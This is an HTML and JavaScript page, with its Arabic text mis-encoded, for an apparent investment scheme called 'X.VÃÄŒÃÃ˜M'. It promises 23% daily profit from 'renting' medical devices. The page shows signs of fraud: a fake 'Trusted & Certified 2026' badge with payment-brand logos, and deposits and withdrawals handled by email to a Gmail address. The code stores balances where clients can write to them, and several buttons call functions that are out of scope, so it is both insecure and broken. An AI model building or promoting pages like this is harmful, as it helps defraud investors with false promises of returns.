<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>X.VÃÄŒÃÃ˜M</title>

<style>
*{box-sizing:border-box;font-family:"Cairo",sans-serif}
body{
  margin:0;direction:rtl;
  background:url("https://images.unsplash.com/photo-1586773860418-d37222d8fce3?q=80&w=1600") center/cover fixed;
  color:#fff
}
.overlay{background:rgba(6,19,31,.9);min-height:100vh;padding-bottom:80px}
header{text-align:center;padding:20px}

.container{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
  gap:18px;padding:20px
}

.card{
  background:rgba(255,255,255,.1);
  backdrop-filter:blur(12px);
  border-radius:20px;
  padding:15px;text-align:center;
  border:1px solid rgba(255,255,255,.2);
  box-shadow:0 10px 30px rgba(0,0,0,.4)
}
.card img{width:100%;height:120px;object-fit:contain}
.card button{
  padding:8px 12px;border:none;border-radius:20px;
  font-weight:bold;cursor:pointer;margin-top:5px
}
.card button[disabled]{background:#555;cursor:not-allowed}

.wallet{
  position:fixed;top:15px;right:15px;
  background:linear-gradient(135deg,#00e5ff,#0066ff);
  color:#000;padding:12px 18px;border-radius:40px;
  display:flex;gap:6px;align-items:center;
  font-weight:bold;z-index:1000;flex-wrap:wrap
}
.wallet button{
  border:none;background:#000;color:#00e5ff;
  padding:5px 10px;border-radius:20px;cursor:pointer;font-size:12px
}

.toast{
  position:fixed;top:-100px;right:50%;
  transform:translateX(50%);
  background:#e53935;color:#fff;
  padding:12px 25px;border-radius:30px;
  transition:.5s;z-index:4000
}
.toast.show{top:30px}

/* TRUST */
.trust-section{
  margin:30px 20px;padding:25px;
  background:rgba(255,255,255,.05);
  border-radius:20px;text-align:center
}
.trust-logo{
  display:inline-block;margin-bottom:15px;
  padding:10px 20px;border-radius:30px;
  background:linear-gradient(135deg,#00ffea,#0066ff);
  color:#000;font-weight:bold;cursor:pointer
}
.trust-badges{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(80px,1fr));
  gap:15px;margin-top:20px
}
.trust-badges img{width:45px;opacity:.8;transition:.3s}
.trust-badges img:hover{opacity:1;transform:scale(1.1)}

/* POPUPS */
.popup,.modal{
  position:fixed;top:50%;left:50%;
  transform:translate(-50%,-50%);
  background:#fff;color:#000;
  width:340px;border-radius:20px;
  padding:20px;text-align:center;
  display:none;z-index:5000
}
.popup button,.modal button{
  margin-top:10px;padding:8px 15px;
  border:none;border-radius:20px;
  background:#0066ff;color:#fff;cursor:pointer
}
.modal input{
  width:100%;padding:10px;margin-top:10px;
  border-radius:15px;border:1px solid #ccc
}
.modal p{font-size:13px;color:#555;margin:8px 0}

/* Ø²Ø± Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø²ÙŠØ¯ */
.more-btn-container{
  display:flex;
  justify-content:center;
  margin:20px 0;
}

.more-btn{
  padding:12px 25px;
  border:none;
  border-radius:30px;
  background:linear-gradient(135deg,#ff9800,#ff5722);
  color:#fff;
  font-weight:bold;
  cursor:pointer;
  font-size:14px;
  box-shadow:0 8px 20px rgba(0,0,0,.35);
  transition: transform 0.3s, box-shadow 0.3s;
}

.more-btn:hover{
  transform:scale(1.05);
  box-shadow:0 12px 30px rgba(0,0,0,.45);
}
</style>
</head>

<body>
<div class="overlay">

<div class="wallet">
ğŸ’° <span id="balance">0</span> Ø¬
<button onclick="dailyLogin()">ØªØ³Ø¬ÙŠÙ„</button>
<button onclick="toggleModal('withdrawBox')">Ø³Ø­Ø¨</button>
<button onclick="toggleModal('addBox')">Ø¥ÙŠØ¯Ø§Ø¹</button>
<button onclick="showTransactions()">Ø§Ù„Ø³Ø¬Ù„</button>
</div>

<header>
<h1>ğŸ¥ X.VÃÄŒÃÃ˜M</h1>
<p>Ø§Ø³ØªØ«Ù…Ø§Ø±Ø§Øª Ù…ÙˆØ«ÙˆÙ‚Ø© | Ø£Ø±Ø¨Ø§Ø­ ÙŠÙˆÙ…ÙŠØ© | Ù…Ù†ØµØ§Øª Ø¹Ø§Ù„Ù…ÙŠØ©</p>
</header>

<div class="more-btn-container">
  <button class="more-btn" onclick="moreDevices()">Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</button>
</div>

<div class="trust-section">
<div class="trust-logo" onclick="toggleModal('trustPopup')">âœ”ï¸ Trusted & Certified 2026</div>
<div class="trust-badges">
<img src="https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
</div>
</div>

<!-- POPUPS -->
<div class="container" id="products"></div>

<div class="modal" id="withdrawBox">
<h3>Ø·Ù„Ø¨ Ø³Ø­Ø¨</h3>
<input type="number" id="withdrawAmount" placeholder="Ø§Ù„Ù…Ø¨Ù„Øº">
<p>Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ø¯Ù†Ù‰ Ù„Ù„Ø³Ø­Ø¨: <strong>230 Ø¬</strong></p>
<button onclick="requestWithdraw()">Ø¥Ø±Ø³Ø§Ù„</button>
<button onclick="toggleModal('withdrawBox')">Ø¥ØºÙ„Ø§Ù‚</button>
</div>

<div class="modal" id="addBox">
<h3>Ø·Ù„Ø¨ Ø¥ÙŠØ¯Ø§Ø¹</h3>
<input type="number" id="addAmount" placeholder="Ø§Ù„Ù…Ø¨Ù„Øº">
<button onclick="addFunds()">Ø¥Ø±Ø³Ø§Ù„</button>
<button onclick="toggleModal('addBox')">Ø¥ØºÙ„Ø§Ù‚</button>
</div>

<div id="toast" class="toast"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, onAuthStateChanged, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { getFirestore, doc, onSnapshot, updateDoc, setDoc, getDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyD5qHSNK17JFLxUj_9mnKbb7XsYVSwb9u8",
  authDomain: "btechno-b5d80.firebaseapp.com",
  projectId: "btechno-b5d80",
  storageBucket: "btechno-b5d80.appspot.com",
  messagingSenderId: "147019806629",
  appId: "1:147019806629:web:bc7828be9ae8c4b4f1da4c"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let currentUID = null;
let balance = 0;
let transactions = [];

const products=[
{id:1,name:"Ø¬Ù‡Ø§Ø² Ø¶ØºØ· Ø¯Ù…",price:900,img:"images2/Press.jpg"},
{id:2,name:"Ø¬Ù‡Ø§Ø² ECG",price:2500,img:"images2/Ecg.jpg"},
{id:3,name:"Ø¬Ù‡Ø§Ø² Ø£ÙƒØ³Ø¬ÙŠÙ†",price:1800,img:"images2/O2.jpg"},
{id:4,name:"Ø¬Ù‡Ø§Ø² ØªÙ†ÙØ³ ØµÙ†Ø§Ø¹ÙŠ",price:4500,img:"images2/Tanafs.jpg"},
{id:5,name:"Ø³Ø±ÙŠØ± Ø·Ø¨ÙŠ",price:4000,img:"images2/Sereer.jpg"},
{id:6,name:"Ø¬Ù‡Ø§Ø² Ø£Ø´Ø¹Ø©",price:5200,img:"images2/Seen.jpg"},
{id:7,name:"Ø¬Ù‡Ø§Ø² Ø´ÙØ·",price:1500,img:"images2/Shaft.jpg"},
{id:8,name:"Ø¬Ù‡Ø§Ø² Ø³ÙƒØ±",price:700,img:"images2/Sugar.jpg"}
];

/* ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ù…Ø¬Ù‡ÙˆÙ„ */
signInAnonymously(auth).catch(console.error);

onAuthStateChanged(auth,(user)=>{
  if(user){
    currentUID = user.uid;
    const userDoc = doc(db,"users",currentUID);

    /* Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Firestore Ø¥Ø°Ø§ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ */
    setDoc(userDoc, { balance: 0, transactions: [], rented: {} }, { merge:true });

    onSnapshot(userDoc,(docSnap)=>{
      const data = docSnap.data();
      balance = data.balance || 0;
      transactions = data.transactions || [];
      document.getElementById("balance").innerText = balance;

      renderProducts(data.rented || {});
      dailyUpdate(); // <--- Ù‡Ù†Ø§ Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±Ø¨Ø­ Ø§Ù„ÙŠÙˆÙ…ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹

    });
  }
});

function renderProducts(rented){
  const container = document.getElementById("products");
  container.innerHTML = "";

  products.forEach(p => {
    const card = document.createElement("div");
    card.className = "card";

    card.innerHTML = `
      <img src="${p.img}">
      <h4>${p.name}</h4>
      <p>${p.price} Ø¬</p>
      <p style="color:#00c853">Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ ${(p.price*0.23).toFixed(0)} Ø¬</p>
    `;

    const btn = document.createElement("button");
    btn.textContent = rented[p.id] ? "ØªÙ… Ø§Ù„ØªØ£Ø¬ÙŠØ±" : "ØªØ£Ø¬ÙŠØ±";
    btn.disabled = rented[p.id];

    // âœ… Ù†Ø¶ÙŠÙ click listener Ø¨Ø¯Ù„ onclick
    btn.addEventListener("click", async () => {
      console.log("rent clicked", p.id, p.price, "UID:", currentUID, "Balance:", balance); // Ù„Ù„ØªØªØ¨Ø¹
      if(!currentUID){ showToast("âŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„..."); return; }
      if(balance < p.price){ showToast("âŒ Ø§Ù„Ø±ØµÙŠØ¯ ØºÙŠØ± ÙƒØ§ÙÙŠ"); return; }

      const userDoc = doc(db,"users",currentUID);
      const newBalance = balance - p.price;

      await updateDoc(userDoc, {
        balance: newBalance,
        [`rented.${p.id}`]: true,
        transactions: arrayUnion({type:"ØªØ£Ø¬ÙŠØ±", amount:-p.price, date: new Date().toLocaleString()})
      });

      // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù…Ø­Ù„ÙŠØ©
      const docSnap = await getDoc(userDoc);
      const data = docSnap.data();
      balance = data.balance;
      document.getElementById("balance").innerText = balance;

      showToast("ØªÙ… Ø§Ù„ØªØ£Ø¬ÙŠØ± âœ…");

      // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ù†ØªØ¬Ø§Øª Ø¨Ø¹Ø¯ Ø§Ù„ØªØ£Ø¬ÙŠØ±
      renderProducts(data.rented || {});
    });

    card.appendChild(btn);
    container.appendChild(card);
  });
}


function showToast(m){
  const t=document.getElementById("toast");
  t.innerText=m;t.classList.add("show");
  setTimeout(()=>t.classList.remove("show"),3000);
}

function moreDevices(){
  showToast("âš ï¸ ØªØ¹Ø°Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø­Ø§Ù„ÙŠØ§Ù‹");
}

async function addTransaction(type,amount){
  transactions.push({type,amount,date:new Date().toLocaleString()});
  await updateDoc(doc(db,"users",currentUID),{ transactions });
}

/* ØªØ£Ø¬ÙŠØ± */
// --- Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ£Ø¬ÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© ---
window.rent = async function(id, price) {
  if(balance < price){ 
    showToast("âŒ Ø§Ù„Ø±ØµÙŠØ¯ ØºÙŠØ± ÙƒØ§ÙÙŠ"); 
    return; 
  }

  const userDoc = doc(db,"users",currentUID);

  // Ù†Ø­Ø³Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
  const newBalance = balance - price;

  // Ù†Ø­Ø¯Ø« rented Ùˆbalance Ùˆtransactions Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙŠ Firebase
  await updateDoc(userDoc, {
    balance: newBalance,
    [`rented.${id}`]: true,
    transactions: arrayUnion({type:"ØªØ£Ø¬ÙŠØ±", amount:-price, date: new Date().toLocaleString()})
  });

  // Ø¨Ø¹Ø¯ Ù…Ø§ ÙŠØ­Ø¯Ø« FirestoreØŒ Ù†Ø¬ÙŠØ¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø±Ø© ØªØ§Ù†ÙŠØ© Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù…Ø­Ù„ÙŠØ©
  const docSnap = await getDoc(userDoc);
  const data = docSnap.data();
  balance = data.balance;
  transactions = data.transactions;

  // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØµÙØ­Ø©
  document.getElementById("balance").innerText = balance;

  showToast("ØªÙ… Ø§Ù„ØªØ£Ø¬ÙŠØ± âœ…");
}




/* ØªØ³Ø¬ÙŠÙ„ ÙŠÙˆÙ…ÙŠ */
async function dailyLogin(){
  const userDoc = doc(db,"users",currentUID);
  const lastDaily = transactions.find(t=>t.type==="Ù…ÙƒØ§ÙØ£Ø©")?.date || 0;
  const now = Date.now();
  if(now - new Date(lastDaily).getTime() >= 86400000){
    balance += 40;
    document.getElementById("balance").innerText = balance;
    await updateDoc(userDoc,{balance});
    await addTransaction("Ù…ÙƒØ§ÙØ£Ø©",40);

    showToast("âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„ÙŠÙˆÙ…ÙŠ");
  }else showToast("â³ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙƒÙ„ 24 Ø³Ø§Ø¹Ø©");
}
async function addDailyProfit() {
  if(!currentUID) return; // Ù„Ùˆ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø´ Ù…Ø³Ø¬Ù„ Ø¨Ø¹Ø¯

  const userDoc = doc(db,"users",currentUID);
  const docSnap = await getDoc(userDoc);
  const data = docSnap.data();

  const rented = data.rented || {};
  let totalProfit = 0;

  products.forEach(p => {
    if(rented[p.id]) {
      totalProfit += p.price * 0.23; // Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ 23%
    }
  });

  if(totalProfit > 0){
    balance += totalProfit;
    document.getElementById("balance").innerText = balance;

    await updateDoc(userDoc,{balance});
    await addTransaction("Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ", totalProfit);

    showToast(`ğŸ’° ØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø±Ø¨Ø­ Ø§Ù„ÙŠÙˆÙ…ÙŠ: ${totalProfit.toFixed(0)} Ø¬`);
  }
}
async function dailyUpdate() {
  const lastDailyProfit = transactions.filter(t=>t.type==="Ø±Ø¨Ø­ ÙŠÙˆÙ…ÙŠ").pop()?.date || 0;
  const now = Date.now();

  if(now - new Date(lastDailyProfit).getTime() >= 86400000){ // 24 Ø³Ø§Ø¹Ø©
    await addDailyProfit();
  }
}


/* Ø³Ø­Ø¨ */
async function requestWithdraw(){
  const a = +document.getElementById("withdrawAmount").value;
  if(a<230){ showToast("âŒ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ø¯Ù†Ù‰ Ù„Ù„Ø³Ø­Ø¨ 230 Ø¬"); return; }
  if(a>balance){ showToast("âŒ Ø§Ù„Ø±ØµÙŠØ¯ ØºÙŠØ± ÙƒØ§ÙÙŠ"); return; }

  balance -= a;
  document.getElementById("balance").innerText = balance;
  const userDoc = doc(db,"users",currentUID);
  await updateDoc(userDoc,{balance});
  await addTransaction("Ø³Ø­Ø¨",-a);

  showToast("âœ… Ø·Ù„Ø¨ Ø§Ù„Ø³Ø­Ø¨ ØªÙ…");
  window.location.href=`mailto:btechno1010@gmail.com?subject=Ø·Ù„Ø¨ Ø³Ø­Ø¨&body=Ø§Ù„Ù…Ø¨Ù„Øº: ${a}`;
}

/* Ø¥ÙŠØ¯Ø§Ø¹ */
async function addFunds(){
  const a = +document.getElementById("addAmount").value;
  if(a<=0){ showToast("âŒ Ù…Ø¨Ù„Øº ØºÙŠØ± ØµØ§Ù„Ø­"); return; }

  await addTransaction("Ø¥ÙŠØ¯Ø§Ø¹",a);
  showToast("âœ… Ø·Ù„Ø¨ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ ØªÙ…");
  window.location.href=`mailto:btechno1010@gmail.com?subject=Ø·Ù„Ø¨ Ø¥ÙŠØ¯Ø§Ø¹&body=Ø§Ù„Ù…Ø¨Ù„Øº: ${a}`;
}

/* Ø³Ø¬Ù„ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø§Øª */
function showTransactions(){
  if(transactions.length === 0){ alert("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø³Ø¬Ù„"); return; }
  alert(transactions.map(t=>`${t.date} | ${t.type} | ${t.amount}`).join("\n"));
}

/* ÙØªØ­/Ø§ØºÙ„Ø§Ù‚ Ø§Ù„Ù…ÙˆØ¯Ø§Ù„ */
function toggleModal(id){
  const m=document.getElementById(id);
  m.style.display=m.style.display==="block"?"none":"block";
}
</script>

</body>
</html>   
